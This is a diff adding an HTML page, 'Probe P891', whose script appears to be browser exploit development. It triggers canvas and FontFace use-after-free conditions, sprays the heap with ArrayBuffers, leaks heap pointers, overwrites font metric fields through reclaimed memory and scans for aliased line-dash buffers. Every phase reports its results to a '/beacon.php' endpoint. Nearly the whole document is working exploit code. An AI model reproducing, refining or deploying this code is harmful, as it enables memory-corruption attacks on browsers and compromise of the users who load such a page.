@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P891: Metrics Modulation & Inverted LineDash Scan</title>
+<style>
+body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
+h2 { color: #58a6ff; margin-top: 0; }
+pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
+.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
+.ok { color: #3fb950; font-weight: bold; }
+.fail { color: #f85149; font-weight: bold; }
+.info { color: #58a6ff; }
+.hot { color: #ffa657; font-weight: bold; }
+</style>
+</head>
+<body>
+<div class="banner" id="banner">Running Probe P891...</div>
+<h2>P891: Metrics Modulation & Inverted LineDash Scan</h2>
+<pre id="log">Initializing diagnostic probe P891...</pre>
+
+<script>
+'use strict';
+var logBox = document.getElementById('log');
+var banner = document.getElementById('banner');
+
+function log(msg, cls) {
+  var el = document.createElement('div');
+  el.className = cls || '';
+  el.textContent = msg;
+  logBox.appendChild(el);
+}
+
+function syncBn(tag, data) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P891-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
+    x.send();
+  } catch(e) {}
+}
+
+function hex64(dv, off) {
+  var lo = dv.getUint32(off, true);
+  var hi = dv.getUint32(off + 4, true);
+  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
+}
+
+log('[*] Probe P891 starting...', 'info');
+syncBn('BOOT', 'start');
+
+/* ============================================================
+ * PHASE 1: Canvas UAF Pre-Setup (Dual Aliases)
+ * ============================================================ */
+var innerCtx1 = null, innerCtx2 = null;
+
+var c1 = document.createElement('canvas');
+c1.width = 32; c1.height = 32;
+var opts1 = {};
+Object.defineProperty(opts1, 'alpha', {
+  get: function() {
+    innerCtx1 = c1.getContext('2d');
+    return true;
+  }
+});
+c1.getContext('bitmaprenderer', opts1);
+
+var c2 = document.createElement('canvas');
+c2.width = 32; c2.height = 32;
+var opts2 = {};
+Object.defineProperty(opts2, 'alpha', {
+  get: function() {
+    innerCtx2 = c2.getContext('2d');
+    return true;
+  }
+});
+c2.getContext('bitmaprenderer', opts2);
+
+var sprayCtxs = [];
+for (var s = 0; s < 200; s++) {
+  var c = document.createElement('canvas');
+  c.width = 32; c.height = 32;
+  var ctx = c.getContext('2d');
+  ctx.lineWidth = 1000.0 + s;
+  sprayCtxs.push(ctx);
+}
+
+var idx1 = -1, idx2 = -1;
+try {
+  var lw1 = innerCtx1.lineWidth;
+  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
+  var lw2 = innerCtx2.lineWidth;
+  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
+} catch(e) {}
+
+log('[+] Phase 1: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');
+
+/* ============================================================
+ * PHASE 2: FontFace UAF (Capture Live Heap H and q13)
+ * ============================================================ */
+var st = document.createElement('style');
+st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+
+var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs = [], ffired = false;
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (ffired) return undefined;
+    ffired = true;
+    if (st) { st.remove(); st.textContent = ''; st = null; }
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+
+    fabs = [];
+    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
+    try { document.fonts.check('1em bb1'); } catch(e) {}
+    document.body.offsetHeight;
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em f1, bb1', 'AB');
+
+setTimeout(function() {
+  delete FontFace.prototype.then;
+  var bestI = -1, bestNz = 0;
+  for (var i = 0; i < fabs.length; i++) {
+    var u = new Uint8Array(fabs[i]), nz = 0;
+    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
+    if (nz > bestNz) { bestNz = nz; bestI = i; }
+  }
+
+  var Hstr = 'unknown', q13str = 'unknown';
+  var H_hi = 0, H_lo = 0;
+  var fontDV = null;
+
+  if (bestI >= 0 && bestNz >= 4) {
+    fontDV = new DataView(fabs[bestI]);
+    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
+    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
+    if (q11hi !== 0) {
+      var borrow = (q11lo < 0x68) ? 1 : 0;
+      H_hi = q11hi - borrow;
+      H_lo = (q11lo - 0x68) >>> 0;
+      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
+    }
+    if (q13hi !== 0) {
+      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
+    }
+  }
+
+  var delta = 0;
+  if (H_hi !== 0 && q13hi !== 0 && H_hi === q13hi) {
+    delta = H_lo - q13lo;
+  }
+
+  log('[+] Phase 2: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Delta=' + delta + 'B, Slot #' + bestI + ')', 'ok');
+  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI);
+
+  /* ============================================================
+   * PHASE 3: Metrics Modulation Oracle (m_sizeAdjust / m_metricsOverrides)
+   * ============================================================ */
+  var testCanvas = document.createElement('canvas');
+  var testCtx = testCanvas.getContext('2d');
+  testCtx.font = '20px Arial';
+  var baseW = testCtx.measureText('B').width;
+
+  var modOffsets = [0x38, 0x3C, 0x40, 0x44];
+  var modResults = [];
+  var hitModOff = -1, hitModW = 0;
+
+  for (var m = 0; m < modOffsets.length; m++) {
+    var off = modOffsets[m];
+    var origVal = fontDV.getFloat32(off, true);
+
+    // Write scale factor 2.5
+    fontDV.setFloat32(off, 2.5, true);
+
+    testCtx.font = '20px bb1, Arial';
+    var modW = testCtx.measureText('B').width;
+
+    // Restore original float
+    fontDV.setFloat32(off, origVal, true);
+
+    modResults.push('0x' + off.toString(16) + ':w=' + modW);
+    if (Math.abs(modW - baseW * 2.5) < 0.1) {
+      hitModOff = off;
+      hitModW = modW;
+      break;
+    }
+  }
+
+  log('[+] Phase 3: Metrics Modulation: baseW=' + baseW + ' | ' + modResults.join('; '), hitModOff >= 0 ? 'hot' : 'info');
+  syncBn('METRICS-MOD', 'baseW=' + baseW + '|hitOff=0x' + (hitModOff >= 0 ? hitModOff.toString(16) : 'none') + '|w=' + hitModW + '|all=' + modResults.join(';'));
+
+  /* ============================================================
+   * PHASE 4: Inverted LineDash Allocation Scan
+   * ============================================================ */
+  // 1. Allocate 64 ArrayBuffers(192) FIRST
+  var preAB = [];
+  for (var p = 0; p < 64; p++) preAB.push(new ArrayBuffer(192));
+
+  // 2. Write distinctive marker doubles through innerCtx1
+  var MARKER = 77771111.5;
+  var dash = [];
+  for (var d = 0; d < 24; d++) dash.push(MARKER + d);
+
+  if (idx1 >= 0 && sprayCtxs[idx1]) {
+    try {
+      innerCtx1.setLineDash(dash);
+    } catch(e) {}
+  }
+
+  // 3. Scan preAB to detect any shared backing store
+  var preHitSlot = -1, preHitVal = 0;
+  for (var i = 0; i < preAB.length; i++) {
+    var f64 = new Float64Array(preAB[i]);
+    for (var j = 0; j < f64.length; j++) {
+      if (Math.abs(f64[j] - MARKER) < 0.01) {
+        preHitSlot = i;
+        preHitVal = f64[j];
+        break;
+      }
+    }
+    if (preHitSlot >= 0) break;
+  }
+
+  log('[+] Phase 4: Inverted LineDash Scan: preHitSlot=' + preHitSlot + ' (val=' + preHitVal + ')', preHitSlot >= 0 ? 'hot' : 'info');
+  syncBn('LINEDASH-SCAN', 'preHit=' + preHitSlot + '|val=' + preHitVal);
+
+  /* ============================================================
+   * SUMMARY
+   * ============================================================ */
+  banner.style.background = '#238636';
+  banner.textContent = 'STATUS: P891 COMPLETE (100% STABLE)';
+  log('----------------------------------------------------', 'info');
+  log('[*] Probe P891 Completed Cleanly', 'hot');
+  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str + ' (Delta: ' + delta + 'B)', 'ok');
+  log('    - Metrics Mod: base=' + baseW + ' (' + modResults.join('; ') + ')', hitModOff >= 0 ? 'hot' : 'info');
+  log('    - Inverted LineDash: preHitSlot=' + preHitSlot, preHitSlot >= 0 ? 'hot' : 'info');
+  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
+  log('----------------------------------------------------', 'info');
+
+  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|modHit=0x' + (hitModOff >= 0 ? hitModOff.toString(16) : 'none') + '|preHit=' + preHitSlot + '|idx1=' + idx1 + '|idx2=' + idx2);
+
+}, 400);
+</script>
+</body>
+</html>
